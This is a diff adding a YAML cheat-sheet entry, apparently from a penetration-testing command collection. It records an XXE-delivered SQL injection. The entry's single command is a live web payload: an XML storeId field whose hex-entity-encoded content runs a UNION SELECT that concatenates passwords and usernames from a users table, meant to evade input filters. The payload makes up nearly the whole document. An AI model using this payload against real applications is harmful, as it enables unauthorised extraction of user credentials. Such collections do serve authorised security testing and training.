@@ -1,0 +1,18 @@
+name: XXE SQLi
+description: SQL injection inside XXE payload
+commands:
+  - command: |
+      <storeId>
+      <@hex_entities>
+      1 UNION SELECT password || '~' || username from users;
+      <@/hex_entities>
+      </storeId>
+    description: HEX encoded SQLi with XXE and combinding two rows with ~
+tags:
+  - xxe
+  - sqli
+show:
+links:
+  -
+references:
+  -
